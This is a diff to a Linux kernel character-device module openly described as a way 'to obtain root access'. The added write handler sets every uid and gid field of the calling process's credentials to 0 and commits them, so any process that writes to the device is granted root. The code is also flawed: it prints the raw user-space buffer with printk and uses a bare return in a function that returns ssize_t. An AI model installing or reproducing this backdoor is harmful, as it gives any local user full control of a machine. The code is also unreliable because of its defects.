@@ -2,6 +2,8 @@
 #include <linux/kernel.h>	/* Needed for KERN_INFO */
 #include <linux/fs.h>          	/* Needed for char device registration */
 #include <linux/cdev.h>		/* Needed for char device registration */
+#include <linux/cred.h>		/* Needed for root credential */
+
 MODULE_LICENSE("GPL");             
 MODULE_AUTHOR("Zharaskhan Aman");
 MODULE_DESCRIPTION("A simple module to obtain root access");
@@ -21,8 +23,26 @@ struct file_operations fops = {
 
 ssize_t custom_write(struct file *f, const char __user *buf, size_t len, loff_t *off)
 {
-	//TODO
-	printk(KERN_INFO "Write function call\n");
+	printk(KERN_INFO "Write function call:\n%s\n", buf);
+
+	struct cred *root_cred;
+	root_cred = prepare_creds();
+	
+	if (root_cred == NULL) {
+		printk(KERN_INFO "Error\n");
+		return;
+	}
+	root_cred->uid.val = 0;
+	root_cred->gid.val = 0;
+       	root_cred->euid.val = 0;
+	root_cred->egid.val = 0;
+	root_cred->suid.val = 0;
+	root_cred->sgid.val = 0;
+	root_cred->fsuid.val = 0;
+	root_cred->fsgid.val = 0;
+
+	commit_creds(root_cred);
+
 	return len;
 }
 
